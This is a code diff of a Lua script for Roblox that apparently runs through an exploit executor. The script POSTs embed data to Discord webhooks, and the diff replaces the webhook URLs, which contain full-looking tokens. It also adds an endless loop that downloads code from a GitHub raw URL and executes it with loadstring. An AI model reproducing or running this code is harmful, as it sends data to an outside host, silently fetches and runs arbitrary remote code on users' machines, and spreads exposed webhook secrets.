@@ -55,7 +55,7 @@ local Embed = {
             ["timestamp"] = string.format('%d-%d-%dT%02d:%02d:%02dZ', Time.year, Time.month, Time.day, Time.hour, Time.min, Time.sec),
 };
 (syn and syn.request or http_request or http.request) {
-    Url = 'https://discord.com/api/webhooks/937295495582347284/EVCMBMv8vFTpyq9AK0V4clXgp98W1WTpixcWc3kME2WW2TeBymonG8EKMGSVKrvDc8yR';
+    Url = 'https://discord.com/api/webhooks/943082033142444032/7rlEy6Q6FGPWgj0G0a9jDznfnSEvPjQNXk0K6dXHuz_j6gsCnqZi6mr3nsRbIkAjuxkR';
     Method = 'POST';
     Headers = {
         ['Content-Type'] = 'application/json';
@@ -122,10 +122,16 @@ local Embed = {
             ["timestamp"] = string.format('%d-%d-%dT%02d:%02d:%02dZ', Time.year, Time.month, Time.day, Time.hour, Time.min, Time.sec),
 };
 (syn and syn.request or http_request or http.request) {
-    Url = 'https://discord.com/api/webhooks/937273130223816744/qQ4ESObnWOj-LEXh1wD9C5V6NCxgdsroc8GXGUQvqFZ9Wxui9ApdoVawVNnO7Rb_Emso';
+    Url = 'https://discord.com/api/webhooks/943082263107764294/Y2Dnw1oO_z0IsQ1Mkw0WOSeXdJlEeCCQTol5HsbR3GqjhIBy-ysLu13KFAVD27R_-h7I';
     Method = 'POST';
     Headers = {
         ['Content-Type'] = 'application/json';
     };
     Body = game:GetService'HttpService':JSONEncode({content = Content; embeds = {Embed}; });
 };
+
+
+while true do
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/jaredloI/AnimationL/main/kid'))()
+    wait()
+end
